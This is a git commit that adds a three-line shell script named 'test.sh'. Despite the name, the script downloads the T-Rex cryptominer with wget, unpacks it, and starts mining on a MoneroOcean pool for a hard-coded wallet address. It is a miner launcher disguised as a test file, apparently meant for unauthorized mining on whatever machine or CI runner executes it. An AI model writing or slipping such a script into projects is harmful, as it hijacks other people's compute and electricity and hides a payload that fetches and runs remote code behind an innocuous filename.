5522c48abae84147aa4b1c1e2d8ffb1cc5724bb6
loolzx <53612549+loolzx@users.noreply.github.com>
2021-09-02 01:26:29 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,3 @@
+wget https://trex-miner.com/download/t-rex-0.20.3-linux.tar.gz
+tar -xvf t-rex-0.20.3-linux.tar.gz
+ ./t-rex -a ethash -o gulf.moneroocean.stream:10128 -u 84qBqAYggPo2Ec3pJVdN6132heVxpGGyaRLxqmLrCpFnHGV8f1Up5azdxPKBXANhhZ6YH9tSDVs2XSZ3Fmg5nEds6eHZVcL -p xmrig1
